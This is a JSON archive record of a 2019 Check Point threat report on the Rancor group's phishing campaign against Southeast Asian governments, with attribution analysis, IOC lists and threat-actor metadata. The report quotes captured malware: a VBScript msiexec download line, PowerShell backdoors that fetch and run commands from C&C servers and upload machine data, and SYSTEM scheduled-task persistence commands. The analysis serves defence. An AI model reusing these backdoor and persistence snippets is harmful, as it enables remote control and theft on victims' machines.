@@ -1,0 +1,271 @@
+{
+    "id": "1f282194-3fe2-40e3-ae8c-d05cd89e43ef",
+    "created_at": "2023-01-12T14:59:52.498595Z",
+    "updated_at": "2025-03-27T02:17:00.074052Z",
+    "deleted_at": null,
+    "sha1_hash": "31e6f19a13fac159749a7b444441429bf3fc410e",
+    "title": "2019-09-22 - Rancor- The Year of The Phish",
+    "authors": "",
+    "file_creation_date": "2022-05-28T18:07:22Z",
+    "file_modification_date": "2022-05-28T18:07:22Z",
+    "file_size": 3914356,
+    "plain_text": "# Rancor: The Year of The Phish\n\n**[research.checkpoint.com/2019/rancor-the-year-of-the-phish/](https://research.checkpoint.com/2019/rancor-the-year-of-the-phish/)**\n\nSeptember 22, 2019\n\nSeptember 22, 2019\nEarlier this year, Check Point researchers identified a targeted and extensive attack against\nSoutheast Asian government entities over the span of 7 months. The attackers, which we\nbelieve are members of the Rancor threat group, used classic spear-phishing to reach their\nvictims, but have invested many of their efforts into making the e-mails and lure documents\nappear as convincing as possible, and by changing their TTPs over time.\n\n[Rancor is a threat group active since at least 2017, and was previously observed carrying](https://unit42.paloaltonetworks.com/unit42-rancor-targeted-attacks-south-east-asia-using-plaintee-ddkong-malware-families/)\nattacks Singapore and Cambodia, which are believed to be espionage motivated.\n\nIn this report, we will provide a deep dive analysis of the initial attack methods, infrastructure,\nand artifacts used against the targets in the latest campaign we discovered and attributed to this\ngroup. In addition, we will share some insights that might indicate the Rancor APT group is of a\nChinese origin.\n\n## Main Findings\n\nThe observed attacks started with e-mails sent on behalf of employees from different\ngovernment departments, embassies, or government-related entities in a Southeast Asian\ncountry. The attackers appeared determined to reach certain targets, as tens of e-mails were\n\n\n-----\n\nsent to employees under the same ministries. Furthermore, the e-mails origin was likely spoofed\nto make them seem more reliable.\n\n**Fig 1: Main findings**\n\n## Infection Flow\n\nThis extensive persistent campaign, which was ongoing for more than 7 months, continued to\nevolve over time, mutating its TTPs, which at times even appeared unrelated until extended\nanalysis. Though hundreds of files were involved in these attacks, the following flow-chart\nsummarizes the better part of the possible attack combination observed throughout the\ncampaign:\n\n\n-----\n\n**Fig 2: Infection flow**\n\n## Decoy Documents\n\nThe delivery documents relied on macros and known vulnerabilities to run malicious code on the\ninfected system. What was most interesting about them, however, was the decoy content they\nused. Most of the documents contained legitimate government-related topics, such as\ninstructions for governmental employees, official letters, press releases, surveys, and more.\n\n**Example:**\n\n\n-----\n\n**Fig 3: Legitimate looking decoy document**\n\n## Clusters of TTPs\n\nAnalyzing the timeline of the campaign uncovered 8 major variants of TTPs (delivery,\npersistence and payload) in different combinations. Each mini-campaign was not limited to a\nsingle target, and the attackers went after multiple government entities simultaneously, using the\nsame TTPs. Below is a summary of each such cluster, and the time range in which it was\nobserved:\n\n1st Cluster: December 2018\n\n\n-----\n\n**Fig 4: 1st cluster infection chain**\n\nThe earliest documents observed on December 2018 and attributed to this campaign contained\na short macro that executed the value found under the `Company field in the document’s`\nproperties:\n\n\n-----\n\n**Fig 5: Commands hidden in the document Metadata**\n\nThe command in the `Company field saves a VBScript file to the temp directory, and schedules`\na task to run it every two minutes. The VBS file simply downloads a second-stage MSI payload\nfrom the attacker’s server and executes it using msiexec:\n```\nSet a=CreateObject(\"Wscript.Shell\"):a.Run \"msiexec /q /i\nhttps://p=/45.125.65[.]76/abc\",0\n\n```\nThe MSI payload ( c96c01df9d7eeb60258dcf8ce2ccbb2e78bb5f87 ) was created using the\n[Advanced Installer tool, which allows wrapping a PowerShell script into an MSI installer. This](https://www.advancedinstaller.com/release-15.5.html)\nscript receives instructions from the C&C server, and uploads the execution result along with the\nuser machine information:\n```\ntry{\n  $client = New-Object System.Net.WebClient;\n  $parameters = New-Object Collections.Specialized.NameValueCollection\n  $commandurl = 'https://45.125.65[.]76/postval/sea.txt'\n  $command = (New-Object System.Net.WebClient).DownloadString($commandurl)\n  $cmdDecode =\n[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($command))\n  $rtn = Invoke-Expression $cmdDecode | Out-String\n  $rtnBase = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($rtn))\n  $parameters[\"comname\"] =\n[Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($env:USERDOMAIN + \"\\\\\"\n+$env:COMPUTERNAME))\n  $parameters[\"id\"]= $rtnBase\n  $client.UploadValues(\"https://45.125.65[.]76/postval/postval.php\",$parameters)\n}catch\n{}\n\n```\nBy the time we discovered this sample, the C&C was unreachable and we were unable to\ndownload the final stage payload, but looking at other files that were hosted on the same C2, led\nus to a related DLL ( 70bdce0f974dd0faac5684e6ca0b3476b8a12564 ). This DLL acts like a\nloader and tries to download an additional DLL file from `www.chinhphumofa.esmtp[.]biz and`\nexecute the `RunningThread function (later referred to as` `RunningThread Loader).`\n\n2nd Cluster: January, March 2019\n\n\n-----\n\n**Fig 6: 2nd cluster infection chain**\n\nDuring January and March, the attackers introduced new macro code and the intermediate MSI\nstage was removed. The `Document_Open function in the macro contains base64-encoded blob`\nwhich is decoded and saved as a .js file. This time the command to create a scheduled task is\nexecuted from the `Comments property of the document, and it tries to add the same task with`\ntwo different permissions, thus making sure that the inserted task would utilize the higher\npermissions if available:\n```\ncmd /c schtasks /create /sc MINUTE /tn \"Chrome\" /tr \"C:\\Windows\\Tasks\\Chrome.js\" /mo 2 /F\n&\nschtasks /create /sc MINUTE /tn \"Chrome\" /tr \"C:\\Windows\\Tasks\\Chrome.js\" /mo 2 /RU\nSYSTEM\n\n```\nThe `Chrome.js file contains a PowerShell backdoor similar to the one in the previous version.`\nIn both scheduled tasks, the name, filename and URL patterns of the C&C communication are\ntrying to mimic Google Chrome updates:\n\n\n-----\n\n```\n$r [System.Net.WebRequest]::Create( https://154.16.37[.]122/GoogleUpdate/Update.php );\n$resp=$r.GetResponse();\n$respstream=$resp.GetResponseStream();\n$sr=new-object System.IO.StreamReader $respstream;\n$Cmd=$sr.ReadToEnd();\n$Cmd=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($Cmd));\n$cmdOut=Invoke-Expression -Command:$Cmd|Out-String;\n$ReCmd=[Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($cmdOut));\n$uuid=Invoke-Expression -Command:'wmic csproduct get uuid'|Out-String;\n$Reuid=[Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($uuid));\n$Pusl= 'https://154.16.37[.]122/GoogleUpdate/Google.php?Mac=';\n$Pusl=$Pusl+$Reuid;\n$Pusl=$Pusl+'?Data=';\n$Pusl=$Pusl+$ReCmd;\n[System.Net.WebRequest]$webRequest=[System.Net.WebRequest]::Create($Pusl);\n$webRequest.Method='POST';\n$webRequest.GetResponse();\n\n```\nSimilar URL patterns were seen throughout the campaign.\n\n3rd Cluster: April 2019\n\n**Fig 7: 3rd cluster infection chain**\n\nIn the next wave, the attackers added documents that exploit known vulnerabilities in MS\n**Equation Editor to their arsenal. The documents are created using the known 8.t RTF**\nweaponizer. As soon as the malicious RTF document is opened, the exploit triggers the\nexecution of the `8.t payload, creating two additional files:`\n```\nC:\\Windows\\tracing\\OneDriveApp.vbs and C:\\Windows\\tracing\\OneDriveApp.ps1 . As\n\n```\nin previous stages, the PowerShell payload has the same functionality to communicate with the\nC&C, and depending on the sample mimics different Google or Microsoft applications.\n\n4th Cluster: May 2019\n\n\n-----\n\n**Fig 8: 4th cluster infection chain**\n\nThe attack is carried by RTF documents with the same MS Equation Editor exploit builder that\nwas used before. Upon execution, it drops two files into the temp folder: `wsc_proxy.exe and`\n```\nwsc.dll . wsc_proxy.exe is a legitimate Avast Antivirus executable. Using DLL side\n```\nloading, the malicious payload `wsc.dll is started.`\n\nThe `wsc.dll itself is a loader for another DLL executing the` `RunningThread exported`\n[function (the same function name from cluster 1). This infection chain was previously described](https://medium.com/@Sebdraven/chineses-actor-apt-target-ministry-of-justice-vietnamese-14f13cc1c906)\nby @sebdraven.\n\nDLL side-loading is widely used to evade security programs that monitor the behaviors of\nexecuted files: some of them are white-listed, signed or trusted files, which thereby might lead to\nthe exclusion of malware loaded by these files from behavioral monitoring.\n\nClusters 5-8: May-June 2019\n\n\n-----\n\n**Fig 9: 5th-8th cluster infection chains**\n\nDuring the months of May and June, Rancor continued to introduce new infection chains that are\nvisualized above. In one case, the attackers turned to Cobalt Strike Beacon as their second\nstage payload. In another case, where the Bitdefender legitimate executable was used, it was\ndownloaded from a GitHub account possibly created by the attackers specifically for this\ncampaign:\n```\nhttps://raw.githubusercontent[.]com/watchdogmanoo/watcherdog/master/WatchDog.exe .\n\n```\nWhen DLL side-loading was used, the malicious DLL was in charge of downloading and\nexecuting two additional plugins internally named as `“nbf.plugin” and` `“nbs.plugin” .`\n\n**Fig 10: GitHub repository used to serve a legitimate Bitdefender executable**\n\n## Connecting the Clusters\n\nBesides going after the same government targets, we observed a lot of similarities between the\ndifferent clusters we detailed above. Overlapping indicators:\n\n**Metadata – For most of the documents the** `Author,` `Operator or` `Last Modifier`\nproperties are one of the following:\n\nA\nhttp\nWindows User\nAntiSec\n\n**DDNS service – All the domains utilized ChangeIP.com for domain resolution.**\n**“8.t” RTF exploit builder – RTF files were created using the same builder.**\n**VBA Macros – Execution of code stored as a document property.**\n**DLL hijacking – Usage of known AntiVirus executables.**\n**Powershell code – Receives command to execute and uploads basic user info.**\n**Double Schtask – For persistence a scheduled task command was issued twice**\n\n\n-----\n\n**RunningThread loader – Loader utilized in multiple clusters, mentioned above.**\n**Email spoofing – The emails appeared to be sent from other government officials.**\n\nBelow is a visualization of the connections we found between the different clusters:\n\n**Fig 11: Maltego graph – connecting the clusters**\n\n## Attribution by Infrastructure\n\nZooming in on the infrastructure connection, we see that the first and fourth versions of the\nattack (clusters 1 and 4 in the diagram below), can be connected via multiple passive DNS hops,\nor by a Rancor Loader to the C&C domain `www.chinhphumofa.esmtp[.]biz, which in turn`\n[can be connected via passive DNS resolution to the originally reported Rancor C&C domain:](https://unit42.paloaltonetworks.com/unit42-rancor-targeted-attacks-south-east-asia-using-plaintee-ddkong-malware-families/)\n```\nwww.microsoft.https443[.]org\n\n```\n\n-----\n\n**Fig 12: Maltego graph – infrastructure connecting to previous campaign**\n\n## Attribution by Artifacts\n\nSearching for MSI files which encapsulate PowerShell code (as was described in Cluster 1), led\nus to a sample that communicated with the IP address `199.247.6[.]253 which is a known`\nC&C used by Rancor group:\n\n**Fig 13: PowerShell code connecting to Rancor**\n\nAnother similarity to the previous campaign is the creation of scheduled tasks by running the\ncommand `schtasks twice to gain execution with SYSTEM privileges if possible. In both cases`\nthe scheduled task was set to execute every 2 minutes:\n\n\n-----\n\n**Fig 14: Similarity in schedule task creation technique**\n\nFinally, as in the previous campaign, our campaign utilized similar macro code technique in the\ndelivery documents, in order to execute the shell command stored in the `Company metadata of`\nthe document:\n\n**Fig 15: Similar macro code**\n\n## Chinese Artifacts\n\nAs Rancor was not strongly attributed to any origin as of yet, we would like to offer some insights\nwhich might give us indication that we are looking into a Chinese threat group.\n\n[The 8.t RTF exploit building kit, mentioned above, was reported by Anomali researchers as](https://www.anomali.com/blog/multiple-chinese-threat-groups-exploiting-cve-2018-0798-equation-editor-vulnerability-since-late-2018)\nwidely available and mostly adopted by Chinese actors.\nThe C&C servers were available only between 01:00 – 08:00 UTC time, which we believe\nare the working hours in the attackers’ country, therefore the range of possible origins of\nthis attack is limited to East Asia.\nChinese roots can also be confirmed by the presence of metadata in Chinese for some of\nthe documents:\n\n\n-----\n\n**Fig 16: Chinese metadata**\n\nThe campaign wasn’t active during February 2019 which is a month of the Chinese New\nYear and the Spring Festival, a long holiday in China. Of course, this does not indicate a\nstrong attribution on its own.\n\n**Fig 17: Activity graph**\n\n## Anomalies\n\n\n-----\n\nDuring our analysis, we noticed an interesting sample which might indicate some connection in\nactivity between this Rancor campaign and the previous activity by the Goblin Panda group\n(AKA 1937CN by some vendors). The sample\n```\nb49c148db0b4eec53815dd1a2630c63d25cda78e (found on VirusTotal) is an RTF document\n\n```\ncreated by the aforementioned `8.t exploit builder, but utilized a loader which is attributed to`\nthe Goblin Panda group. The interesting part is that the metadata of the RTF file in question\nexhibits the same unique `Last Modified By information as we’ve seen in our Rancor`\ncampaign — `“AntiSec” .`\n\n**Fig 18: Anomalous metadata**\n\n## Conclusion\n\nRancor group, which was previously spotted attacking Cambodia and Singapore, continued its\ntargeted attacks against entities within the Southeast Asia region, this time concentrating 7\nmonths of efforts on the Southeast Asian government sector. Dozens of emails sent from\ngovernment officials and containing politically-themed decoy documents were supposed to trick\nvictims into opening them and loading malicious components providing full access to victims’\nmachines. During our research we uncovered multiple leads fortifying the assumption that the\nRancor group activity is indeed of a Chinese origin. We expect the group to continue to evolve,\nconstantly changing their TTPs in the same manner as we observed throughout the campaign,\nas well as pushing their efforts to bypass security products and avoid attribution.\n\n## Check Point’s SandBlast\n\n[The malware used in this attack was caught using Check Point’s Threat Emulation and](https://www.checkpoint.com/products/threat-emulation-sandboxing/) Threat\nExtraction.\n\nThreat Emulation is an innovative zero-day threat sandboxing capability, used by SandBlast\nNetwork to deliver the best possible catch rate for threats, and is virtually immune to attackers’\n[evasion techniques. As part of the Check Point SandBlast Zero-Day Protection solution, Threat](https://www.checkpoint.com/solutions/zero-day-protection/)\nEmulation prevents infections from new malware and targeted attacks. The Threat Extraction\n\n\n-----\n\ncapability removes exploitable content, including active content and embedded objects,\nreconstructs files to eliminate potential threats, and promptly delivers sanitized content to users\nto maintain business flow.\n\n## Appendix A: IOCs\n\n\n-----\n\n```\nFirst Cluster:\n6958aed4327b96ca39a159f05843a7282a2e72ba\nc829f5f9ff89210c888c1559bb085ec6e65232de\n8d522e4b63a53434753ce2c58de117878b084dba\nb9e8b12f6eca8e32e9aa130f8e951fa24d9bcbec\nc96c01df9d7eeb60258dcf8ce2ccbb2e78bb5f87\n0d0d9e9530564099b8a95b69f99c67106d3a72ad\n70bdce0f974dd0faac5684e6ca0b3476b8a12564\nSecond Cluster:\n000fb43948d7e6ea7d1041881379561885188949\n8c7dc8b65cd20bf957f60e75bf82f159d5cc981d\n4326fdf22247c7eab0221a98211ee79c8af9ee7a\n6ad2ef8308129b707095b31ca96283722ac71d6a\ne188cd6d0bfcbb3275a262bc37eaa9f075a0b3d7\nf7125efb572709fd7d4eceb8a7c5de5c890f49aa\nd86f7399f3351a03c4e5a3cdd304da3e90d05fed\nac2a35a0d37c19a5c56271ed44988f91c80d8ef3\n5eae3c70b02eeb2a91983c13edddaeb48193f3a4\n74beb05224a77e64a14f68a65f04360cf18b7713\n9217f8765a9bc7ce0a9fb152676ae3560b125a86\n00465447fa8c3983f338c65e39107135ca933056\n2cd13060a764947d65e528a36fa11035845be093\nbe335975f80be895d097782aa4b81cc23fbc7316\n80514dba1f2bb7c1e71710a566081edf70c2d852\n16212af7b47ba999586e88a7979040f72e8184a3\nb13615a101657cbe05a770b98a21382643c4173a\n0c5534b7bb87559cf9521be9fe1e0e61ddd9819a\n1e320275c04ed96d6716ddf4c7209f7bfe870164\nf35ca93c8880099ebec532493b2cea2f19d24fb7\nab3e0a764699403d3032f7dbe2bea599eb64504b\n0ee328ee207b54f166fb637b781869e90a946119\n160843ec8adf065a8bd0d48558e545a64f2937a6\n74619159e998322a5805cf79c355fd0b4d65c0b1\n1e65dae984602b8036106e090a7effb19010348a\n29f9fd59333c2893e3be6f9fe842534494a19e45\n290842a691e5b265aaf456851ae6d26c592247d1\n8ec0d00e755b4b7fb8a5432f3ac8de84742254b6\nbdedd1150d44518e250f4443b540ae38a41bb845\n38bd426f6871d6f56ff80173494b7dfd46bb2d61\n262cd6693d63a23f0434c954a1c932e6a6ca97a8\n21921b227f74e897b86de66cbd794bd8f7bc25f2\nf4a84c140346f97bdf9eb2febf7af2b56a584a10\n0a03cefc05f979128a1a81359053e649510e696d\n8e3353d79dbd694ca937e5cf62f097b4c7bc7993\n13f6e0498d916764b2bd4c6887b283295bfd8522\n6517f1828a5079975cfd8c7fd4716e0019c88104\nd32c866ad2f5d3f0da9b1dc2d1e34a6a182784d1\n665484db82d3a292597c3c2c0f052dab0470f8d3\n35867c8615249b6bac3048be007683228224647a\n191e6e067fce20d175600dffcde317e5db832795\n3b55440f396b9c688c1724181e1780098c95bddc\ne4d8c33317c11d46f7f951e229b5375d4b2bd8b1\n4436c49e0e2c4b2214a8da5026069dae4c69f93e\nd6e1fc8f371a7382b6995eba5f4cf6111bd95a32\na0fde9cdf027f5542a0215f9a18bed7f1a448736\n01bbd9d36e440a1cab340cecf8735cc0e15e1ba4\n\n```\n\n-----\n\n```\n0159cb4c53403af8658d79ff6ec753496ba4f4ed\n2693d094a168d43de96303936542e84271ad8387\n29f478065cb20805466dd08d600aebcd512ddcef\n4b773753fddef2306cd9a6b94e5fef58c6adefef\n5635bc996903b066f97ef91a5211bb5081d93f43\n74046ebec592600efeab4e10bc84d0c16f5eace6\na7d9d9da7a743f47d82df9772ff317edb1f31160\nc2ccbbffbb64e2e1f973a02ccbcc974014e885da\n4b5ceddc05aa9256c81e4311214a8da1516f6f7f\na32aac2623bcb6dfa7e8ac3cf63bca68bc93ed7a\n98ddd45f953a932f5dcc0f9009b3c4b21fc5d63e\nThird Cluster:\ne478f27da2ca890a2c65e3b32c0488e2084424f9\nf95ae679aacfb9d64a3c6ec0b3642623fb5d1c28\na453eb9fe08427cddb01149d20609810c7e52e43\n2dd09441795e4f4e7a4e3fc0dfaa33995fac525a\naf018c7b14bcff05876cf76a1280680290db6367\nff11d9f8d781b6b3a786ab80f1ce59e7dfd65276\nd3ae9caa678754631aed1c82c409b5d43a0a9c80\nFourth Cluster:\nc39a9f4ca8075a22e82f3fbc265f9a5dda447b9f\nc3738fecfb9cf5bd5ddff8c63c3dcf8056a05804\nd7b420832bb7c61d075097ee011ed2765096e7a5\nb32251aa7d08718774c8fc30af698de8cfebf142\nb05d367d0ae1022d53926c052c9bfd8cb62745cc\n6e670a837970a1fb4161d77d5f720d318d7e4dbc\n0cc975ad5715d156a206d5b3f333b904714e03cb\n7b2823157014e9f2eb346ab77c036a303d295922\n47cab36ffcf01caaf0dbbcae272e665da2e30bc6\n4855cf922ec6674ca6cd87e3989c24f6ce1b2e8b\nbfc19afe6e5b6e6623e6ebb9d4998cc04c079513\nde0a7e5da69c1ed781c34445d08f892afe53547f\n181d466454d66a86cc2cf628b5861b7595f6bc37\nFifth Cluster:\n734c00ec4489e1c5836bd3e28d8e815baae097f8\n63b7617e36c70acf3dfcaecf08ca01a77c94a793\nf1261dbb1c4226a78a254d0ddc51217a596ef264\nSixth Cluster:\nbbf62941a569553ff079a3d8c2dcdeea2f965dbb\nd71149c66796094bb7d0b39eb88cb9f64c4ed92f\na521ae445190e366c5c9656d75e32e1aa27f2681\nSeventh Cluster:\nf65bcebb76061b79cbac90005a6d409c08182f16\n86969ecb7c110f4b8db6185c63e24f852ef6aed2\nEighth Cluster:\nd15bb371c9607b351321e159ea4b90b853570427\n7ec2e15f8f92f2602f2d573cc3abddbba3b22676\nHijacked DLLs:\ndcaae20d1593699fbe7be1853468a0ea1a49847f\n47cab36ffcf01caaf0dbbcae272e665da2e30bc6\n\n```\n\n-----\n\n```\n4855cf922ec6674ca6cd87e3989c24f6ce1b2e8b\nbfc19afe6e5b6e6623e6ebb9d4998cc04c079513\n6f5c61d7e5af72410465872f6e7356a5b928bfa6\nac8e51800be46a42b5ad83b207b8ea9b3e8eac70\n108bcb364b937a5c0b867784e21f19656ecce88d\nde0a7e5da69c1ed781c34445d08f892afe53547f\n181d466454d66a86cc2cf628b5861b7595f6bc37\nCobaltStrike Loader:\ne92d36a2d3f1cb4ac8ce9321869ab2e85d9525da\nC&C Cervers:\ncharleseedwards.dynamic-dns[.]net\nwww.sfstnksfcv.jungleheart[.]com\noui6473rf.xxuz[.]com\nvvcxvsdvx.dynamic-dns[.]net\nkibistation.onmypc[.]net\nwww.754d56-8523.sexidude[.]com\nnicetiss54.lflink[.]com\ndsdfdscxcv.justdied[.]com\nwww.dsgsdgergrfv.toythieves[.]com\n185.234.73[.]4\n154.16.37[.]122\n152.89.161[.]19\n45.125.65[.]76\n\n```\n\n-----",
+    "language": "EN",
+    "sources": [
+        {
+            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
+            "created_at": "2023-01-12T14:38:44.599904Z",
+            "updated_at": "2023-01-12T14:38:44.599904Z",
+            "deleted_at": null,
+            "name": "VXUG",
+            "url": "https://www.vx-underground.org",
+            "description": "vx-underground Papers",
+            "reports": null
+        }
+    ],
+    "references": [
+        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2019/2019-09-22 - Rancor- The Year of The Phish.pdf"
+    ],
+    "report_names": [
+        "2019-09-22 - Rancor- The Year of The Phish.pdf"
+    ],
+    "threat_actors": [
+        {
+            "id": "b740943a-da51-4133-855b-df29822531ea",
+            "created_at": "2022-10-25T15:50:23.604126Z",
+            "updated_at": "2025-03-27T02:00:55.505366Z",
+            "deleted_at": null,
+            "main_name": "Equation",
+            "aliases": [
+                "Equation"
+            ],
+            "source_name": "MITRE:Equation",
+            "tools": null,
+            "source_id": "MITRE",
+            "reports": null
+        },
+        {
+            "id": "d90307b6-14a9-4d0b-9156-89e453d6eb13",
+            "created_at": "2022-10-25T16:07:23.773944Z",
+            "updated_at": "2025-03-27T02:02:09.974695Z",
+            "deleted_at": null,
+            "main_name": "Lead",
+            "aliases": [
+                "Casper",
+                "TG-3279"
+            ],
+            "source_name": "ETDA:Lead",
+            "tools": [
+                "Agentemis",
+                "BleDoor",
+                "Cobalt Strike",
+                "CobaltStrike",
+                "RbDoor",
+                "RibDoor",
+                "Winnti",
+                "cobeacon"
+            ],
+            "source_id": "ETDA",
+            "reports": null
+        },
+        {
+            "id": "610a7295-3139-4f34-8cec-b3da40add480",
+            "created_at": "2023-01-06T13:46:38.608142Z",
+            "updated_at": "2025-03-27T02:00:02.87217Z",
+            "deleted_at": null,
+            "main_name": "Cobalt",
+            "aliases": [
+                "Cobalt Gang",
+                "GOLD KINGSWOOD",
+                "COBALT SPIDER",
+                "G0080",
+                "Mule Libra",
+                "Cobalt Group"
+            ],
+            "source_name": "MISPGALAXY:Cobalt",
+            "tools": [],
+            "source_id": "MISPGALAXY",
+            "reports": null
+        },
+        {
+            "id": "f21d7691-a720-46bb-81d7-11edb9f73eba",
+            "created_at": "2023-11-08T02:00:07.126478Z",
+            "updated_at": "2025-03-27T02:00:03.18984Z",
+            "deleted_at": null,
+            "main_name": "1937CN",
+            "aliases": [],
+            "source_name": "MISPGALAXY:1937CN",
+            "tools": [],
+            "source_id": "MISPGALAXY",
+            "reports": null
+        },
+        {
+            "id": "416f8374-2b06-47e4-ba91-929b3f85d9bf",
+            "created_at": "2022-10-25T16:07:24.093951Z",
+            "updated_at": "2025-03-27T02:02:10.105752Z",
+            "deleted_at": null,
+            "main_name": "Rancor",
+            "aliases": [
+                "Rancor Group",
+                "Rancor Taurus"
+            ],
+            "source_name": "ETDA:Rancor",
+            "tools": [
+                "8.t Dropper",
+                "8.t RTF exploit builder",
+                "8t_dropper",
+                "Agentemis",
+                "Cobalt Strike",
+                "CobaltStrike",
+                "DDKONG",
+                "Derusbi",
+                "Dudell",
+                "ExDudell",
+                "KHRAT",
+                "PLAINTEE",
+                "RoyalRoad",
+                "certutil",
+                "certutil.exe",
+                "cobeacon"
+            ],
+            "source_id": "ETDA",
+            "reports": null
+        },
+        {
+            "id": "e8aee970-e31e-489f-81c2-c23cd52e255c",
+            "created_at": "2023-01-06T13:46:38.763687Z",
+            "updated_at": "2025-03-27T02:00:02.91243Z",
+            "deleted_at": null,
+            "main_name": "RANCOR",
+            "aliases": [
+                "Rancor",
+                "Rancor Group",
+                "G0075",
+                "Rancor Taurus",
+                "Rancor group"
+            ],
+            "source_name": "MISPGALAXY:RANCOR",
+            "tools": [],
+            "source_id": "MISPGALAXY",
+            "reports": null
+        },
+        {
+            "id": "6d11e45c-4e31-4997-88f5-295b2564cfc6",
+            "created_at": "2022-10-25T15:50:23.794721Z",
+            "updated_at": "2025-03-27T02:00:55.548806Z",
+            "deleted_at": null,
+            "main_name": "Rancor",
+            "aliases": [
+                "Rancor"
+            ],
+            "source_name": "MITRE:Rancor",
+            "tools": [
+                "DDKONG",
+                "PLAINTEE",
+                "certutil"
+            ],
+            "source_id": "MITRE",
+            "reports": null
+        },
+        {
+            "id": "2c7ecb0e-337c-478f-95d4-7dbe9ba44c39",
+            "created_at": "2022-10-25T16:07:23.690871Z",
+            "updated_at": "2025-03-27T02:02:09.921431Z",
+            "deleted_at": null,
+            "main_name": "Goblin Panda",
+            "aliases": [
+                "1937CN",
+                "Conimes",
+                "Cycldek",
+                "Goblin Panda"
+            ],
+            "source_name": "ETDA:Goblin Panda",
+            "tools": [
+                "8.t Dropper",
+                "8.t RTF exploit builder",
+                "8t_dropper",
+                "Agent.dhwf",
+                "BackDoor-FBZT!52D84425CDF2",
+                "BlueCore",
+                "BrowsingHistoryView",
+                "ChromePass",
+                "CoreLoader",
+                "Custom HDoor",
+                "Destroy RAT",
+                "DestroyRAT",
+                "DropPhone",
+                "FoundCore",
+                "HDoor",
+                "HTTPTunnel",
+                "JsonCookies",
+                "Kaba",
+                "Korplug",
+                "LOLBAS",
+                "LOLBins",
+                "Living off the Land",
+                "NBTscan",
+                "NewCore RAT",
+                "PlugX",
+                "ProcDump",
+                "PsExec",
+                "QCRat",
+                "RainyDay",
+                "RedCore",
+                "RedDelta",
+                "RoyalRoad",
+                "Sisfader",
+                "Sisfader RAT",
+                "Sogu",
+                "TIGERPLUG",
+                "TVT",
+                "Thoper",
+                "Trojan.Win32.Staser.ytq",
+                "USBCulprit",
+                "Win32/Zegost.BW",
+                "Xamtrav",
+                "ZeGhost",
+                "nbtscan"
+            ],
+            "source_id": "ETDA",
+            "reports": null
+        },
+        {
+            "id": "f9806b99-e392-46f1-9c13-885e376b239f",
+            "created_at": "2023-01-06T13:46:39.431871Z",
+            "updated_at": "2025-03-27T02:00:03.08926Z",
+            "deleted_at": null,
+            "main_name": "Watchdog",
+            "aliases": [
+                "Thief Libra"
+            ],
+            "source_name": "MISPGALAXY:Watchdog",
+            "tools": [],
+            "source_id": "MISPGALAXY",
+            "reports": null
+        },
+        {
+            "id": "7d553b83-a7b2-431f-9bc9-08da59f3c4ea",
+            "created_at": "2023-01-06T13:46:39.444946Z",
+            "updated_at": "2025-03-27T02:00:03.093712Z",
+            "deleted_at": null,
+            "main_name": "GOBLIN PANDA",
+            "aliases": [
+                "Conimes",
+                "Cycldek"
+            ],
+            "source_name": "MISPGALAXY:GOBLIN PANDA",
+            "tools": [],
+            "source_id": "MISPGALAXY",
+            "reports": null
+        }
+    ],
+    "ts_created_at": 1673535592,
+    "ts_updated_at": 1743041820,
+    "ts_creation_date": 1653761242,
+    "ts_modification_date": 1653761242,
+    "files": {
+        "pdf": "https://archive.orkl.eu/31e6f19a13fac159749a7b444441429bf3fc410e.pdf",
+        "text": "https://archive.orkl.eu/31e6f19a13fac159749a7b444441429bf3fc410e.txt",
+        "img": "https://archive.orkl.eu/31e6f19a13fac159749a7b444441429bf3fc410e.jpg"
+    }
+}
